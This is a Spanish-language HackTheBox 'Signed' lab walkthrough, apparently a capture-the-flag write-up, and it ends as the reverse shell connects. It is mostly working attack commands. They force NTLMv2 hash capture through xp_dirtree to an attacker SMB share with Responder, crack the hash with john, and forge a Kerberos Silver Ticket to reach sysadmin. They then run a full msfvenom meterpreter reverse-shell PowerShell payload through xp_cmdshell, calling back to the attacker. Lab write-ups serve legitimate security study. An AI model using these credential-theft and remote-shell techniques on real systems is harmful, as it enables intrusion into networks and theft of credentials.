---
icon: flag
---

# Signed HackTheBox (Intermediate)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-12 10:07 EDT
Nmap scan report for 10.10.11.90
Host is up (0.032s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ssl-date: 2025-10-12T14:07:57+00:00; 0s from scanner time.
| ms-sql-info: 
|   10.10.11.90:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.11.90:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-12T10:46:35
|_Not valid after:  2055-10-12T10:46:35

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.10 seconds
```

Lo interesante que vemos aqui, es que solo hay un puerto de un servidor de `ms-sql`, si nos vamos a la informacion de la maquina veremos que como en un `pentesting` real nos dejan unas credenciales para el acceso por `ms-sql`.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-12 161440.png" alt=""><figcaption></figcaption></figure>

```
User: scott
Pass: Sm230#C5NatH
```

Vamos añadir el dominio que vemos en el reporte de `nmap` en nuestro archivo `hosts` quedando algo asi:

```shell
nano /etc/hosts

#Dentro del nano
<IP>              signed.htb DC01.signed.htb
```

Lo guardamos y si probamos a conectarnos por dicho puerto...

```shell
impacket-mssqlclient 'signed.htb/scott:Sm230#C5NatH@<IP>'
```

Info:

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (scott  guest@master)>
```

Veremos que estaremos dentro, por lo que vamos a realizar un poco de `fuzzing` a ver que vemos.

Despues de un rato se me ocurrio probar a capturar el `hash NTLMv2` con `Responder` forzando desde el `mssqlclient` una conexion a nuestra maquina para que se autentique contra ella y asi poder obtener el `hash NTLMv2` del servicio de `sql`.

```shell
responder -I tun0 -dwv
```

Info:

```
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.79]
    Responder IPv6             [dead:beef:2::104d]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-1U62QY19IUK]
    Responder Domain Name      [YYX1.LOCAL]
    Responder DCE-RPC Port     [49928]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...
```

Ahora estando a la escucha vamos a ejecutar el siguiente comando para intentar listar el recurso compartido de nuestra maquina `share` que no existe para capturar el `hash`.

```mysql
EXEC xp_dirtree '\\<IP_ATTACKER>\share';
```

Ahora si nos vamos donde tenemos el responder, veremos lo siguiente:

```
[SMB] NTLMv2-SSP Client   : 10.10.11.90
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:2c914f52e9cad94c:CD63DA7CD18EE91785CB5FE1FF3B7FE7:010100000000000080A01369623BDC01AF611544208F81110000000002000800590059005800310001001E00570049004E002D0031005500360032005100590031003900490055004B0004003400570049004E002D0031005500360032005100590031003900490055004B002E0059005900580031002E004C004F00430041004C000300140059005900580031002E004C004F00430041004C000500140059005900580031002E004C004F00430041004C000700080080A01369623BDC0106000400020000000800300030000000000000000000000000300000FB8F2F6A87CDC00CDE77FEC68D2E044860C9A5B6F00017F770A0849D5C59BD080A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370039000000000000000000                                                              
[+] Exiting...
```

Veremos que ha funcionado, por lo que vamos a probar a intentar `crackearlo` de esta forma:

> hash.NTLMv2

```
mssqlsvc::SIGNED:2c914f52e9cad94c:CD63DA7CD18EE91785CB5FE1FF3B7FE7:010100000000000080A01369623BDC01AF611544208F81110000000002000800590059005800310001001E00570049004E002D0031005500360032005100590031003900490055004B0004003400570049004E002D0031005500360032005100590031003900490055004B002E0059005900580031002E004C004F00430041004C000300140059005900580031002E004C004F00430041004C000500140059005900580031002E004C004F00430041004C000700080080A01369623BDC0106000400020000000800300030000000000000000000000000300000FB8F2F6A87CDC00CDE77FEC68D2E044860C9A5B6F00017F770A0849D5C59BD080A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370039000000000000000000
```

Ahora si probamos con `john` a `crackearlo`...

```shell
john --wordlist=<WORDLIST> hash.NTLMv2
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
purPLE9795!@     (mssqlsvc)     
1g 0:00:00:01 DONE (2025-10-12 10:30) 0.8620g/s 3870Kp/s 3870Kc/s 3870KC/s purcitititya..punociudad
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado y obtendremos la contraseña de dicho `hash`, ahora lo que podemos hacer con esto es un ataque de `Silver Ticket`, pero antes para realizarlo requerimos de obtener la clave `RC4` (`El hash NT`) de la contraseña en plano que obtuvimos, por lo que vamos a obtenerla con este comando:

```shell
python3 -c "import hashlib,binascii; print(binascii.hexlify(hashlib.new('md4', 'purPLE9795\!@'.encode('utf-16le')).digest()).decode())"
```

Info:

```
ef699384c3285c54128a3ee1ddb1a0cc
```

Ahora teniendo el `hash NT` tendremos que obtener el `SID` del dominio pero en concreto del grupo `IT`.

## Escalate user mssqlsvc (Metasploit)

Si probamos por ejemplo a entrar con las credenciales proporcionadas de `mssqlsvc`:

```shell
impacket-mssqlclient 'signed.htb/mssqlsvc:purPLE9795!@'@<IP> -windows-auth
```

Info:

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  guest@master)>
```

Veremos que funciona, por lo que desde aqui vamos hacer lo siguiente, listaremos los grupos que nos interesan desde el `sql`.

```mysql
SELECT r.name AS role, m.name AS member FROM sys.server_principals r JOIN sys.server_role_members rm ON r.principal_id = rm.role_principal_id JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id WHERE r.name = 'sysadmin';
```

Info:

```
role       member                      
--------   -------------------------   
sysadmin   sa                          

sysadmin   SIGNED\IT                   

sysadmin   NT SERVICE\SQLWriter        

sysadmin   NT SERVICE\Winmgmt          

sysadmin   NT SERVICE\MSSQLSERVER      

sysadmin   NT SERVICE\SQLSERVERAGENT
```

Veremos que efectivamente el que mas nos interesa es el de `IT`.

Desde la consola de `SQL` ejecutaremos lo siguiente:

> Grupo IT (Obtener SID Cifrado)

```shell
SELECT SUSER_SID('SIGNED\IT');
```

Info:

```
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'
```

> Grupo IT (Obtener SID Cifrado)

```mysql
SELECT SUSER_SID('SIGNED\mssqlsvc');
```

Info:

```
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000'
```

Si revisamos los `SID` veremos que el del grupo `IT` tiene el `RID` `1105` y el de nuestro usuario tiene `1103`, pero el `SID` en si del principio es el mismo, por lo que solamente tendremos que cambiar el `RID` para ser del grupo `IT` en principio.

Esto estara codificado, por lo que tendremos que decodificarlo de esta forma:

> Grupo IT (SID)

```shell
python3 -c "
hex_data = '0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'
bytes_data = bytes.fromhex(hex_data)
version = bytes_data[0]
sub_authority_count = bytes_data[1]
identifier_authority = int.from_bytes(bytes_data[2:8], 'big')
sub_authorities = [str(int.from_bytes(bytes_data[8 + 4*i:12 + 4*i], 'little')) for i in range(sub_authority_count)]
domain_sid = f'S-{version}-{identifier_authority}' + ''.join(f'-{sa}' for sa in sub_authorities)
print(f'Full SID: {domain_sid}')
print(f'Domain SID (sin RID): S-{version}-{identifier_authority}-{sub_authorities[0]}-{sub_authorities[1]}-{sub_authorities[2]}')
"
```

Info:

```
Full SID: S-1-5-21-4088429403-1159899800-2753317549-1105
Domain SID (sin RID): S-1-5-21-4088429403-1159899800
```

> Usuario mssqlsvc (SID)

```shell
python3 -c "
hex_data = '0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000'
bytes_data = bytes.fromhex(hex_data)
version = bytes_data[0]
sub_authority_count = bytes_data[1]
identifier_authority = int.from_bytes(bytes_data[2:8], 'big')
sub_authorities = [str(int.from_bytes(bytes_data[8 + 4*i:12 + 4*i], 'little')) for i in range(sub_authority_count)]
domain_sid = f'S-{version}-{identifier_authority}' + ''.join(f'-{sa}' for sa in sub_authorities)
print(f'Full SID: {domain_sid}')
print(f'Domain SID (sin RID): S-{version}-{identifier_authority}-{sub_authorities[0]}-{sub_authorities[1]}-{sub_authorities[2]}')
"
```

Info:

```
Full SID: S-1-5-21-4088429403-1159899800-2753317549-1103
Domain SID (sin RID): S-1-5-21-4088429403-1159899800
```

Teniendolo en texto plano, vamos a solicitar un `silver ticket` de esta forma para podernos autenticar con el.

```shell
impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 -user-id 1103 mssqlsvc
```

Info:

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/mssqlsvc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```

Veremos que ha funcionado, ahora exportaremos la variable para que este en una variable automaticamente:

```shell
export KRB5CCNAME=mssqlsvc.ccache
```

Y seguidamente la utilizaremos para autenticarnos en el servicio de `sql`, pero si tuvieramos problemas puede ser por la zona horaria del servidor de `dominio`, por lo que tendremos que utilizar un `pwnbox` de `HTB` directamente para que funcione.

\===============================================================

> CAMBIAR ZONA HORARIA

```shell
sudo timedatectl set-timezone America/Los_Angeles
```

O bien con este otro comando:

```shell
sudo timedatectl set-ntp off
sudo rdate -n [IP of the DC]
```

\===============================================================

```shell
impacket-mssqlclient -k -no-pass DC01.SIGNED.HTB
```

Info:

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)>
```

Ahora si porbamos a ver si somos del grupo `sysadmin` veremos lo siguiente:

```mysql
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Info:

```
-   
1
```

Vemos que efectivamente si lo somos, por lo que vamos a realizar un poco de `fuzzing` a ver que podemos hacer con dicho grupo.

Si vemos a ver si el comando `xp_cmdshell` estuviera accesible desde este grupo y usuario, veremos lo siguiente:

```mysql
EXEC sp_configure 'xp_cmdshell';
```

Info:

```
name          minimum   maximum   config_value   run_value   
-----------   -------   -------   ------------   ---------   
xp_cmdshell         0         1              1           1
```

Veremos que lo tenemos activo y funcional desde esta sesion, vamos a probar a ejecutar algo sencillo a ver si realmente funciona:

```shell
EXEC xp_cmdshell 'whoami';
```

Info:

```
output            
---------------   
signed\mssqlsvc   

NULL
```

Veremos que esta funcionando, por lo que vamos a realizar una `reverse shell` de esta forma con `metasploit`.

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_ATTACKER> LPORT=<PORT> -f psh-cmd
```

Info:

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of psh-cmd file: 7503 bytes
%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQBlAGwAcwBlAHsAJABiAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwB9ADsAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBTAHQAYQByAHQASQBuAGYAbwA7ACQAcwAuAEYAaQBsAGUATgBhAG0AZQA9ACQAYgA7ACQAcwAuAEEAcgBnAHUAbQBlAG4AdABzAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIAAmACgAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAYwByAGUAYQB0AGUAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAoACgAJwAnAEgAewAxAH0AcwBJAEEASQAzAEMANwBHAGcAQwBBADcAVgBYAGEAMgArAGkAUwBoAGoAKwB2AHMAbgArAEIANwBJAHgARQBWAE0AcgAyAEwAcgBkAGIAcABOAE4ARABpAEEAcQBWAGwAcwBwAGkAbABiAFgAYgBDAGcATQBNAEgAVwB7ADEAfQBGAEkAWQBxADMAYgBQAC8ALwBiAHkARAAwAEUAdQAyADMAYgBQAG4ASgBEAHQAZgBaAEcAYgBlACcAJwArACcAJwA2AC8AUABlAFIAagBjAEwAYgBZAHEAagBrAE0ATwBmAHUATwAvAHYAMwAzAEgAJwAnACsAJwAnAGwAbQBsAGkASgBGAFgAQgA4AEwAZgAvAFcANQBHAHAAMwB1AGgANwBmAE4AWgB7ADEAfQB1AGEALwBoAHoAMgA1ADkAeQBYAHoAaAArAEoAYwBWAHgATgB3AG8AcwBIAEsANwBQAHoAcAAnACcAKwAnACcAUQBzAFMAVgBCAEkAOQAvAHQAVwBIADEARQBwAFQAVgBGAHcAUQB6AEIASwArAFEAYgAzAE4AegBmADMAVQBZAEkATwBMADIAOQB1AGsAVQAyADUANwAxAHoAdABXADYAdABQAG8AaAB1AEwAbABHAFMANQBZAHQAawArAHsAMQB9AGcANgBsADAARwBGADMAbwA4AGkAMgBtAEcARQB0AEkAeQBhAFkAOAAnACcAKwAnACcAdgBXAHYAWAArAHUATgAxAFcARgA3ADMAVgBMAHYATQBvAHUAawBmAE4AMwBJAFUAewAxAH0AcQBDAGwAawBOAEkAdgBjAEgAOQBhAEQAQwBGADAAegB4AEcAZgBIADIATQA3AFMAUgBLAEkANQBlADIANQBqAGcAOABQAG0AcgBOAHcAdABSAHkAMABRAFYASQB1ADAAZABqAFIAUAAzAEkAUwBlAHYAZwB6AFoATQAvAEMAYQBKAFoARQBwAFoAdQBNAFQAbAA3AEsAcgB7ADEAfQBPAG4ANQBNAGsAcwBpAFgASABTAFYAQwBhADEAcAB2AGMAaQBtAGwAWQByAGQAZAAvADgAYQB0AFMALwBWAFUAVwBVAGgAeQBnAGwAaABaAFMAbABFAFMAeABnAFoASgA3AGIASwBPADAATgBiAEIAQwBoADYAQQByADUASwA2AEIAeQA2AEEAJwAnACsAJwAnAEoARAByADEAMQBvAHcARgBrADkAOQBFAEcAOABiAFUAdwBJADYAVABKAC8AUgBjAHgALwBBAFgAYQBWAHUARAA5AEwAaABQACcAJwArACcAJwAvAG4AQQBtAG8ASgBqAFIAcABOAEMARwBxAHIAegBrADYAagBwAHkATQBvAEQAMQByAC8AUgBWAEwASQBSAFUAYQBzAEIANwBUAEEAUgBEADgAdwBVAEIAMABxAHcAUwBLAHMAKwB6AHkAMgB5AHMANQA5AEgAUgBRAHIAVgBWAHgAZwA4AEIAbwBmAGgASwBsAHUATwBEACsAdwBvAGwATgBiAGcAegBhAEwAUgBvAGwATwBXAHgAcgAwAHkAUgBEAGoAZgBVAGoANQBGAHoATgB0AHAAdQAvAEsANgB0AGQATQBRAEkAYgAwAHYAMABFAHcAOQBuAEsAagBMAEMAegBmAHAATAB3AEkAZwBWAHEANQBKADYAUgB2AEoAMwBPAFgAZQBUAGkARQBIAFgAegAwAEEAcQB3AFgAVwBVAHMALwAxAHAAUQBrAEUAdABRAGcAVQBpAHIASQByAHMAQQBBAC8AbAA2ACcAJwArACcAJwBlAFkARwBjAEwAaQBMAEkAcwB5AGgARABtAGUAWABHAFQAMgB4AHEAZwBPAGsAagByADUAeABoAHsAMQB9AHEAQgBFAHMAaQBHAHcASwBWAGcARgBNAFcAKwA4AE4ARwBZAGYATwBMADYAdQBoAFcATQBVAEEASABiADcAUABTAFIAcgB6AFkAVQA2AFEAUgBWADEAVwBSAHQANQBwAFoAMwB0AGcAYQBpAHUARQBDAHQATgBtADkAdwBrAGcAMABLADEAbQA1AHkAQgBMAEkASwBjAEoAaQBlAEYASwBTADYAdgBwAEkAeABHAHgAVwBmADkAeQBkAHgAeABSAGkAaQAyAHIAWgBSAFcAewAxAH0AdABhAE4ARgAyAEMAVwBTAHAAVQBvAFQARwBtAFMAMgBSAEIAVABBAEcAQgBxAHgATQBqAEcARgBtAEYAewAxAH0ATgBMAGsAQgBkAHAAQwBjAEcAOQBpAHIAbABOAGQAZgBSAFUATwB4AEMASQBIAGkAQQBVAG4AMwBFAEEAMAB7ADEAfQBZAFMAZwBZAGwARwBWAEsAQQBuAFoAQwBWAGoAUgBhAEIAcQBKAGEARQBCAE0AVQBBAEUAWABSAE4ASAByAEUAOABxAEIARgBsAEEAVgBTAEoASgBiAGwASQBhAGYAKwBxAHAARgBWAEUAZQB3AHoAbgBtAEYAUwBnAGYASABNAFIAQQBpADAAUQBTAEwAYQA1AEUAeQBjAFUARwBoAEEARAAnACcAKwAnACcATgA4AGkAcwAvADYASABDAFQAOQAzAEgAcgBCAEYAUwBWAEEAWgBGAGIAewAxAH0AcQByAFoAVwBjAFUANQBiADYAdABkAHYAUAB4ADcAMQB6AGwAcAA4AGwAUABBAFUAWQBDAFEAVQBnAGUAawBrAFUAeQBGAGEASwBUAGoAcgA3AEgAcwBOAC8ARQBGAFQAYwAvAFQAagBwAFIAZwA4AFMATABMAFYAMwBwAFoAdQB5AE0AWgB0ADUATwB6AEUAdwBOAGQAdwBlAGUAdQBZAEcAagAyAGEAKwBEADkAKwBhAFoAMgBnADAAbgA2AG4AaQBMAHAAOQA1AEUAeQByACcAJwArACcAJwBHADUAMABaADMASQBDAFgAZABuAGUAOQBLAFcAcQBxAHAAQQB6AG4AWAAyADcASgBrAEQALwBBAG4AYwAxAGoAUQA2ADIAWgAvAHAATgAvAHUATgBNAG0AUgBBADIALwBoAFgAUwB0AGIAYgBlAEkAdgBOAEYAQwBrAGoARAB6AE4AZwAxADkAWgA4ADIAMQBaAFgASQBxAGUAJwAnACsAJwAnAEwAUABhAFUAawBTAEgANwBLAGgAWQBsAHoAOQBBAEgAZQBxAGUAOQB2AEIAagBiAFIAQgBOAE8AaQBZAHcAZgBEAE0AMgBRAEIAbgBPAG0AVAA3AGMASAB3ADYANgAnACcAKwAnACcAMQBBAHoAMQBxAHAAegBOAFkANwBLAGIAUwB4AFgAZwBvACsAYgAxAEwAcAA5AGMAKwA2AGgAWAA4AEcAOABhAC8AMwBQAFIASABYAGIAWABZADIAMgB5AHYAWAA2AGMAcQBWAGsARwBQADIAcgB2AFcAVABSAC8ATgB6AFYAaQBlAHEANwAyAGwAYgBzAGEAYQBkACcAJwArACcAJwA3AEEARgBXADAAZABDAHAAKwBmAEwAYwBLADcAaAAzAFMAZwAyAEIARgBqAHQAOQB2AEEAKwBkAEIANwBHADUAUABSAGgARABPAGIAcQA1AG4ASwBJADAAVgBMAHoAVQBPADUASgB1AGkAUQBaADEAeQBFAHgAYgByAGEASwBKAEgALwAwAEYAUwArADYAbgBJAHEAOQBHAFoAeAB0AHAAbABxAHsAMQB9ADAAMgAvAGkAcwAnACcAKwAnACcAWgBOAGYARAB7ADEAfQBUAFAANQBoAGkAagBPAEoASgAwAFYAWgBKADYAQgBPAG8AegBrAEsAeAB0AFYAMgBqAFAAbwAzAFAAZAAvAEsAagB2ADgAUgBSADMAVwAvAFYAVwAyAEsAcAB7ADEAfQB1AE4AMgBVAHYANwBQACsAeQBZAGsAbgB1AEoAMgBKAFkAQgBwAGEATwBMAEIAOABHAGUAegBOAGgANQAwAE4ASABoADcAQQBYAFcAQwBaAHsAMQB9AHIAVQAnACcAKwAnACcAcgBtACcAJwArACcAJwBBAHcALwBaAFIATQBLAEQAKwBHAEMAbgBBAHoASABCAGEAYgBnAGoAdwB7ADEAfQA4AGUARABvAGQARABDADMAdgBDAHYAagAyAFAAQgBJAE4AdABZAFUAZwBtAEoANwBnAFMAUwB7ADEAfQB4AE4AZQA5AFUAOQB4AFoAUgBlAEcAUgB0AFEAUABiAGMAawA4AEIAQwA4AEIARgBpADcAUQB7ADEAfQAxAHcARgA3AE8AQwBOADcATQBEAGgAWgBDAGUAdwBiADIAaQBNAEYAdwBKAHoASgBiAGcAKwBFAHAAeQBEAHYAYQB2AEMATABUADgAQQBGAGIAWgAyAGwASgBNAHIATgBEAG4AdgBjAGoAYQBiADcAcABuAHkAagA1ADYAVwBRAE0AZgBwAGgAdABrAEIAbQBhADIAWABRACsAQQBKAGwAZwBjADcAWQA1AFoAVABCAEQAYgBMAHUARwBFAHYAWQBOAGIAWABIAGsAMwBGAHoAJwAnACsAJwAnAEoAdwBvAEYAegBiAFgAbgB5ADAAcgBCAGQANQBYAFEAMAB4ACsAYQA5AFkASAA2AEEATABGAC8ATgBjAEUAaQBQAGoAOQBZADEATgBGAG4AYwBwAG0AdwBHAHYASAA5AFgAeQB5AGYAUABNAHYAMgB0AEUAVABlADIAawB0AFMAMwAnACcAKwAnACcAQwBGAFEAQQBqAEsANgBxAEIALwBXAGkAcABGAGQATwBvADAAbQBFAEcAUQBmAFAAdwA3AE4AbQBnADUASQBRAEUAWABnAEkAdwBGAE8AaABLAGwAKwBKAGsATQBoAG0AcwAzAEEALwB0AFcAQQBRADcAOABjAGoAbQA5AFkAJwAnACsAJwAnAHoAcgBUAEQAcQB0AGEAOABHADkAMABqAFkAZQBKAHEAUgAxAGQASABaADIAUgBLAE0AaABJAFoAUQAxAEcAdAByAGgARQBLAFAAKwBrADEAeABkAHkAeQBLAE0ATgB6AEUAbgBkAGcAcABpAHYALwAzAGYAVgBPAGkATwAnACcAKwAnACcATwBmADMAMABwAHAAcwBQAGcASQAyAGoAOQBKAEoASQBSADAARQBZAHAAZgBqACsAVAArAE4ARgB6AHkARABLAEQAVABrAFgAeQBEADIARgBuAGkAZwBlAGcATgBOAEYARAByADYAdgByAGMAeABDAE8AVQBvAEkAJwAnACsAJwAnAHMAOABCAEwAUAB4ADYAVABJAFkAWAA2AEEARgBzAGIAZgBCADgAeABaADUAQQArAHoAUQBCAEMAWQBmAG8AagBxAHQAUgA5AGoANQB7ADEAfQAvAHQANgBvADMAWgB6AHIARAAzADgAeQBkADgAbwBXADcAYwBPAFAAOAA2ACsANQA4ADMAVAAyAGkAOQB2AGYAeQBpAGUAeAB5AGYARAA1ADYAJwAnACsAJwAnAGYARABsAHcAYgBQAEoAOQBzAGYAOABuADEAdQBZAEEAcAAwAEIAYwB7ADEAfQBhAGcALwBhAHYAbgBEAFIAagBLAGEAbgBrAFcAWQBSAFkAYgBLAEEAVwAzAFgATwB6AC8AdwBHAFYARwBEAHkALwBnAGQAVgBsAE0AdQAzADgAQQBMAHEAbwBYADMAewAxAH0AZwBNAEEAQQBBAHsAMAB9ACcAJwApAC0AZgAnACcAPQAnACcALAAnACcANAAnACcAKQApACkAKQAsAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApACkAKQAnADsAJABzAC4AVQBzAGUAUwBoAGUAbABsAEUAeABlAGMAdQB0AGUAPQAkAGYAYQBsAHMAZQA7ACQAcwAuAFIAZQBkAGkAcgBlAGMAdABTAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQAPQAkAHQAcgB1AGUAOwAkAHMALgBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAPQAnAEgAaQBkAGQAZQBuACcAOwAkAHMALgBDAHIAZQBhAHQAZQBOAG8AVwBpAG4AZABvAHcAPQAkAHQAcgB1AGUAOwAkAHAAPQBbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBTAHQAYQByAHQAKAAkAHMAKQA7AA==
```

Con este `payload` ya generado, vamos a ponernos a la escucha desde `metasploit`:

```shell
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT <PORT>
run
```

Ahora si ejecutamos el siguiente comando en el `sql`:

```mysql
EXEC xp_cmdshell 'powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcA<RESTO DE BASE64>...';
```

Ahora si volvemos a donde tenemos la escucha en `metasploit` donde el modulo de `handler` veremos lo siguiente:

```
[*] Started reverse TCP handler on 10.10.14.79:7777 
[*] Sending stage (203846 bytes) to 10.10.11.90
